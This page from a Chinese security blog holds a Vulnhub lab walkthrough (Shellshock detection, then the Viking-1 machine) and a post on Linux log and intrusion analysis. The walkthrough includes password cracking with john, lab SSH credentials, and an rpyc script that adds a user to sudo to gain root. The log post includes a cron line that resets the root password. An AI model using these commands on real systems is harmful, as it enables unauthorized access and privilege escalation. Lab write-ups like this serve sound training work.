<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230120005654865.png" alt="image-20230120005654865"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这里有一个点，就是<code>/cgi-bin/</code>目录扫描，很依赖一些字典，主要是确定存在的文件名</p>
<p>其次是，当扫描发现了<code>shell.sh</code>存在，如何确定其是否存在什么样的漏洞</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/shell.sh,cmd=ls 192.168.1.7</span><br></pre></td></tr></table></figure>

<p>通过nmap的脚本扫描可以得到对应的反馈，<strong>破壳漏洞</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-20 00:59 HKT</span><br><span class="line">Nmap scan report for hacksudothor (192.168.1.7)</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">| http-shellshock: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   HTTP Shellshock vulnerability</span><br><span class="line">|     State: VULNERABLE (Exploitable)</span><br><span class="line">|     IDs:  CVE:CVE-2014-6271</span><br><span class="line">|       This web application might be affected by the vulnerability known</span><br><span class="line">|       as Shellshock. It seems the server is executing commands injected</span><br><span class="line">|       via malicious HTTP headers.</span><br><span class="line">|             </span><br><span class="line">|     Disclosure date: 2014-09-24</span><br><span class="line">|     Exploit results:</span><br><span class="line">|       &lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class="line">|   &lt;html&gt;&lt;head&gt;</span><br><span class="line">|   &lt;title&gt;500 Internal Server Error&lt;/title&gt;</span><br><span class="line">|   &lt;/head&gt;&lt;body&gt;</span><br><span class="line">|   &lt;h1&gt;Internal Server Error&lt;/h1&gt;</span><br><span class="line">|   &lt;p&gt;The server encountered an internal error or</span><br><span class="line">|   misconfiguration and was unable to complete</span><br><span class="line">|   your request.&lt;/p&gt;</span><br><span class="line">|   &lt;p&gt;Please contact the server administrator at </span><br><span class="line">|    webmaster@localhost to inform them of the time this error occurred,</span><br><span class="line">|    and the actions you performed just before this error.&lt;/p&gt;</span><br><span class="line">|   &lt;p&gt;More information about this error may be available</span><br><span class="line">|   in the server error log.&lt;/p&gt;</span><br><span class="line">|   &lt;hr&gt;</span><br><span class="line">|   &lt;address&gt;Apache/2.4.38 (Debian) Server at hacksudothor Port 80&lt;/address&gt;</span><br><span class="line">|   &lt;/body&gt;&lt;/html&gt;</span><br><span class="line">|   </span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169</span><br><span class="line">|       http://seclists.org/oss-sec/2014/q3/685</span><br><span class="line">|       http://www.openwall.com/lists/oss-security/2014/09/24/10</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271</span><br><span class="line">MAC Address: 08:00:27:CC:89:6B (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.74 seconds</span><br></pre></td></tr></table></figure>

<p>这里参考别人文章中推荐的扫描工具</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://172.16.10.106/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line">gobuster dir -u http://172.16.10.106/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x py,sh,php -s 200,204,301,302,307,401,403,500</span><br></pre></td></tr></table></figure>



<h2 id="Viking-1"><a href="#Viking-1" class="headerlink" title="Viking-1"></a>Viking-1</h2><p>信息收集</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-23 21:12 HKT</span><br><span class="line">Nmap scan report for ubuntu (192.168.1.8)</span><br><span class="line">Host is up (0.00038s latency).</span><br><span class="line">Not shown: 998 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 59:d4:c0:fd:62:45:97:83:15:c0:15:b2:ac:25:60:99 (RSA)</span><br><span class="line">|   256 7e:37:f0:11:63:80:15:a3:d3:9d:43:c6:09:be:fb:da (ECDSA)</span><br><span class="line">|_  256 52:e9:4f:71:bc:14:dc:00:34:f2:a7:b3:58:b5:0d:ce (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29</span><br><span class="line">|_http-title: Index of /</span><br><span class="line">| http-ls: Volume /</span><br><span class="line">| SIZE  TIME              FILENAME</span><br><span class="line">| -     2020-10-29 21:07  site/</span><br><span class="line">|_</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">MAC Address: 08:00:27:12:57:B3 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6, Linux 5.0 - 5.4</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.38 ms ubuntu (192.168.1.8)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 14.94 seconds</span><br></pre></td></tr></table></figure>

<p><strong>这里偷跑了，使用正常的dirsearch扫描，使用的默认字典似乎无法扫描出结果，看了一下wp，似乎使用seclist&#x2F;Web-common&#x2F;common.txt</strong>才可以扫描出结果</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230123215510577.png" alt="image-20230123215510577"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -r -u http://192.168.1.8/site/ -w /usr/share/wordlists/Web-Content/common.txt -x txt,php,html</span><br></pre></td></tr></table></figure>

<p>访问对应的页面，得到一句话<code>/war-is-over</code>，访问该页面，得到一串很长的base64编码的数据（太长了，太占地方）</p>
<p>直接用curl访问得到内容</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.1.8/site/war-is-over/ | base64 -d &gt; war-is-over</span><br></pre></td></tr></table></figure>

<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230123220141035.png" alt="image-20230123220141035"></p>
<p>很显然这是一个zip的压缩包&#x3D;&#x3D;（woc这里大佬用CyberChef计算文件的熵约为8判断为压缩包的）&#x3D;&#x3D;</p>
<p>压缩包有密码，，，需要破解，避坑john的一个使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zip2john war-is-over.zip &gt; pwd.txt #提权密码信息</span><br><span class="line">rm -rf /root/.john/john.rec        #删掉该文件才可以开启多线程john爆破</span><br><span class="line">john pwd.txt --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230123224210666.png" alt="image-20230123224210666"></p>
<p>得到压缩密码后，解压到当前目录，是一张图片&#x3D;&#x3D;（md，太像CTF了，直接binwalk必有问题）&#x3D;&#x3D;</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230123225219897.png" alt="image-20230123225219897"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk king -e --run-as=root</span><br></pre></td></tr></table></figure>

<p>很奇怪为啥binwalk要加后面的参数了</p>
<p>解压后是一个user和压缩包，user必是ssh的信息</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230123225445597.png" alt="image-20230123225445597"></p>
<p>直接连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 22 floki@192.168.1.8</span><br><span class="line">f@m0usboatbuilde7</span><br></pre></td></tr></table></figure>

<p><strong>CVE-2021-3156没用</strong>，补充wget下载文件夹命令</p>
<p><code>wget -r -np -nH http://192.168.1.10/CVE-2021-3156-main</code></p>
<p>使用<code>-e &quot;https_proxy=https://127.0.0.1:xxxx&quot;</code>设置单次代理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">lxd:x:105:65534::/var/lib/lxd/:/bin/false</span><br><span class="line">uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">pollinate:x:109:1::/var/cache/pollinate:/bin/false</span><br><span class="line">sshd:x:110:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">floki:x:1000:1000:floki:/home/floki:/bin/bash</span><br><span class="line">ragnar:x:1001:1001::/home/ragnar:/bin/sh</span><br></pre></td></tr></table></figure>

<p>列出<code>/etc/passwd</code>，可以看出还有一个用户叫做ragnar，根据<code>readme.txt</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_______________________________________________________________________Floki-Creation____________________________________________________________________________________________________</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">I am the famous boat builder Floki. We raided Paris this with our all might yet we failed. We don&#x27;t know where Ragnar is after the war. He is in so grief right now. I want to apologise to him.</span><br><span class="line">Because it was I who was leading all the Vikings. I need to find him. He can be anywhere. </span><br><span class="line">I need to create this `boat` to find Ragnar</span><br></pre></td></tr></table></figure>

<p>而下面是boat的内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#Printable chars are your ally.</span><br><span class="line">#num = 29th prime-number.</span><br><span class="line">collatz-conjecture(num)</span><br></pre></td></tr></table></figure>

<p>麻了，真麻了，，，绕了好久好久，，，，，</p>
<p>上面的意思是，在所有可打印的字符中，输出克拉茨猜想对第29个素数的展开结果</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">collatz</span>(<span class="params">num</span>):</span><br><span class="line">    result=[<span class="number">109</span>]</span><br><span class="line">    <span class="keyword">while</span>(num!=<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> (num%<span class="number">2</span>==<span class="number">0</span>):</span><br><span class="line">            num=num/<span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span>(num%<span class="number">2</span>==<span class="number">1</span>):</span><br><span class="line">            num=num*<span class="number">3</span>+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(num&lt;<span class="number">255</span>):</span><br><span class="line">            result.append(<span class="built_in">int</span>(num))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(collatz(<span class="number">109</span>))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">#109, 164, 82, 41, 124, 62, 31, 94, 47, 142, 71, 214, 107, 161, 242, 121, 182, 91, 137, 206, 103, 155, 233, 175, 167, 251, 244, 122, 61, 184, 92, 46, 23, 70, 35, 106, 53, 160, 80, 40, 20, 10, 5, 16, 8, 4, 2, 1</span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230123235745354.png" alt="image-20230123235745354"></p>
<p>解码之后直接把输出的密码登录<code>mR)|&gt;^/Gky[gz=\.F#j5P(</code></p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230123235912614.png" alt="image-20230123235912614"></p>
<p>进入ragnar的文件夹中，有一个user.txt，类似flag</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230124001007238.png" alt="image-20230124001007238"></p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230124000954034.png" alt="image-20230124000954034"></p>
<p>&#x3D;&#x3D;<code>rpyc_classic.py</code>&#x3D;&#x3D;这个玩意儿被每次ssh登录执行，并且是sudo权限下的执行（ragnar用户），直接插入一段权限提升的代码</p>
<p>查看该程序默认端口18812，因此只需要在ragnar的shell下编写一个提升自己权限的rpy文件即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rpyc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">    os.system(<span class="string">&quot;sudo usermod -a -G sudo ragnar&quot;</span>)</span><br><span class="line"></span><br><span class="line">conn = rpyc.classic.connect(<span class="string">&quot;localhost&quot;</span>)</span><br><span class="line"></span><br><span class="line">fn = conn.teleport(shell)</span><br><span class="line"></span><br><span class="line">fn()</span><br></pre></td></tr></table></figure>

<p>运行上面的程序<code>python3 exp.py</code>再切换回floki再切换回ragnar，即可运行提权命令，查看id，被添加了sudo权限，直接<code>sudo -s</code>得到最高权限</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230124011501764.png" alt="image-20230124011501764"></p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230124012147778.png" alt="image-20230124012147778"></p>

    

    

    

  </div>
  <div class="article-info article-info-index">
    
    
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">vulnhub</a>
        		</li>
      		
		</ul>
	</div>

    

    
    <p class="article-more-link">
      <a class="article-more-a" href="/2023/11/22/Vulnhub%E8%AE%B0%E5%BD%95/">展开全文 >></a>
    </p>
    

    
    <div class="clearfix"></div>
  </div>
  </div>
</article>

<aside class="wrap-side-operation">
    <div class="mod-side-operation">
        
        <div class="jump-container" id="js-jump-container" style="display:none;">
            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
                <i class="icon-font icon-back"></i>
            </a>
            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
                <i class="icon-font icon-plane jump-plane"></i>
            </div>
        </div>
        
        
    </div>
</aside>




  
    <article id="post-内网日志分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
  
  
    <h1 itemprop="name">
	
	  <a class="article-title" href="/2023/11/22/%E5%86%85%E7%BD%91%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/" target="_blank">内网日志分析</a>
  
    </h1>
  


  
  
<a href="/2023/11/22/%E5%86%85%E7%BD%91%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/" class="archive-article-date">
        <time datetime="2023-11-21T17:55:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-11-22</time>
</a>

  
  
    

  
  </header>
  
  <div class="article-entry" itemprop="articleBody">
    
    <center>
    内网日志分析
</center>

<h2 id="安全日志审计"><a href="#安全日志审计" class="headerlink" title="安全日志审计"></a>安全日志审计</h2><p>在Debian和Ubuntu系统中，登录日志记录在<code>/var/log/auth.log</code>中，同路径下的<code>messages</code>中包含了巨量的系统信息，查看时建议使用&#x3D;&#x3D;less&#x3D;&#x3D;。</p>
<p>同时，查询全部<strong>ssh失败登录</strong>命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -i Failed /var/log/auth.log</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%86%85%E7%BD%91%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.assets/image-20231122020026361.png" alt="image-20231122020026361"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -i Accepted /var/log/auth.log</span><br></pre></td></tr></table></figure>

<p><strong>统计登陆成功或失败的ip，并进行去重降序排序</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -i Failed /var/log/auth.log |awk &#x27;&#123;print $(NF-3)&#125;&#x27; |grep &#x27;^[0-9]&#x27; |sort |uniq -c |sort -rn</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%86%85%E7%BD%91%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.assets/image-20231122020038208.png" alt="image-20231122020038208"></p>
<p>其中<code>$(NF-3)</code>是指当前行的倒数第三列的连续字符串（以空格分割），该字段表示的是ip地址，<code>grep &#39;^[0-9]&#39;</code>表示用正则表达式保证字段为ip，<code>sort</code>是排序，<code>uniq -c</code>是统计次数.</p>
<p><strong>显示最近几次的登录状态</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">last -a -10</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%86%85%E7%BD%91%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.assets/image-20231122020045115.png" alt="image-20231122020045115"></p>
<p>从上图的<code>still logged in </code>字段可以看出当前的登录账号人数，可以查出恶意入侵，在确定非自己登录时候，接下来该查询对方登录的端口进行后续操作。如</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -anput | grep &quot;:22&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%86%85%E7%BD%91%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.assets/image-20231122020051931.png" alt="image-20231122020051931"></p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>kali作为攻击机，ssh登录了服务器</p>
<p><img src="/../images/%E5%86%85%E7%BD%91%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.assets/image-20231122020057525.png" alt="image-20231122020057525"></p>
<p>我们发现又额外用户持续登录，现检测ssh端口的连接状态</p>
<p><code>ss -anput |grep &quot;:22&quot;</code></p>
<p><img src="/../images/%E5%86%85%E7%BD%91%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.assets/image-20231122020104644.png" alt="image-20231122020104644"></p>
<p>观察进程和ip确定攻击者所使用的进程，使用命令<code>kill -9 12260</code>将对方进程杀死</p>
<p><img src="/../images/%E5%86%85%E7%BD%91%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.assets/image-20231122020111321.png" alt="image-20231122020111321"></p>
<p>可以看到，kali的shell已经断开了连接，然后检测其留下的后门。</p>
<p><code>chattr +i</code>命令，让对应文件无法读写，直接锁上</p>
<p>筛选指定时间以前的内容</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">last -a -t 20190210123030</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Linux用户登录信息放在三个文件中：</p>
<p>1　　&#x2F;var&#x2F;run&#x2F;utmp：记录当前正在登录系统的用户信息，默认由who和w记录当前登录用户的信息，uptime记录系统启动时间；</p>
<p>2　　&#x2F;var&#x2F;log&#x2F;wtmp：记录当前正在登录和历史登录系统的用户信息，默认由last命令查看；</p>
<p>3　　&#x2F;var&#x2F;log&#x2F;btmp：记录失败的登录尝试信息，默认由lastb命令查看。</p>
</blockquote>
<h3 id="查询USER"><a href="#查询USER" class="headerlink" title="查询USER"></a>查询USER</h3><ol>
<li><code>w</code></li>
<li><code>top</code>  但一般不准确</li>
</ol>
<h3 id="查询计划任务"><a href="#查询计划任务" class="headerlink" title="查询计划任务"></a>查询计划任务</h3><p><strong>第一个位置</strong></p>
<p>当产生入侵后，对方可能留有计划任务以产生持续性后门</p>
<p>查看root用户的日志</p>
<p><code>crontab -l</code></p>
<p><img src="/../images/%E5%86%85%E7%BD%91%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.assets/image-20211110010756402.png" alt="image-20211110010756402"></p>
<p>同时，系统的计划任务日志为</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">less /var/log/cron</span><br></pre></td></tr></table></figure>

<p>写一个5分钟更改一次密码的定时任务</p>
<p>先输入<code>crontab -e </code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/5 * * * * echo 123 | passwd --stdin root</span><br></pre></td></tr></table></figure>

<p>该内容储存在<code>/var/spool/cron/root</code>里，删除可以使用<code>crontab -u root -r</code>进行删除</p>
<p><strong>第二个位置</strong></p>
<p><code>/etc/rc.local</code>，每次启动都会执行一次里面的内容</p>
<h2 id="查看异常流量"><a href="#查看异常流量" class="headerlink" title="查看异常流量"></a>查看异常流量</h2><p>&#x3D;&#x3D;补充&#x3D;&#x3D;</p>
<p>防止恶意删除日志，可以将日志文件添加一个只可追加的属性，防止被删内容</p>
<p>使用<code>iftop -i eth0</code>检测网卡流量情况</p>
<p><img src="/../images/%E5%86%85%E7%BD%91%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.assets/image-20211110015916569.png" alt="image-20211110015916569"></p>
<p>TX发送，RX接收，peak峰值，cum总量，rates平均速率</p>
<p>当kali机ping后情况</p>
<p><img src="/../images/%E5%86%85%E7%BD%91%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.assets/image-20211110020040465.png" alt="image-20211110020040465"></p>
<h3 id="tcpdump和udpdump"><a href="#tcpdump和udpdump" class="headerlink" title="tcpdump和udpdump"></a>tcpdump和udpdump</h3><p>输入<code>tcpdump -i eth0 -nnv</code>，抓取ssh登录的tcp数据包</p>
<p>在登陆前tos显示的为<code>0x0</code>，输入错误密码也显示<code>0x0</code>，通过其可以判断服务器的入侵状态，是否被登录。</p>
<p><img src="/../images/%E5%86%85%E7%BD%91%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.assets/image-20211110205437075.png" alt="image-20211110205437075"></p>
<p>对比无ssh连接状态的情况，如下图</p>
<p><img src="/../images/%E5%86%85%E7%BD%91%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.assets/image-20211110205826145.png" alt="image-20211110205826145"></p>
<p>并无反应，我们也可输入抓取指定数量的数据包<code>tcpdump -i eth0 -nnv -c 10</code></p>
<ul>
<li><code>tcpdump -i eth0 -nnv -w ./file1.tcpdump</code></li>
<li><code>tcpdump -i eth0 -r ./file1.tcpdump</code></li>
</ul>
<p>可以将整个过程的数据保存下来，ctrl+C退出，在时间段内进行的流量操作均被写入该文件中</p>
<ul>
<li><code>tcpdump -i eth0 -nnv port 22</code></li>
</ul>
<p>指定监听22端口的数据包</p>
<ul>
<li><code>tcpdump -i eth0 -nnv net 192.168.122.0/24</code></li>
</ul>
<p>抓取指定网段的数据包</p>
<ul>
<li><code>tcpdump -i eth0 -nnv host 192.168.122.2</code></li>
</ul>
<p>抓指定主机间的数据包</p>
<p><strong>以协议作为条件</strong></p>
<ol>
<li><code>tcpdump -i eth0 -nnv arp </code></li>
<li><code>tcpdump -i eth0 -nnv icmp </code></li>
<li><code>tcpdump -i eth0 -nnv udp </code></li>
<li><code>tcpdump -i eth0 -nnv tcp </code></li>
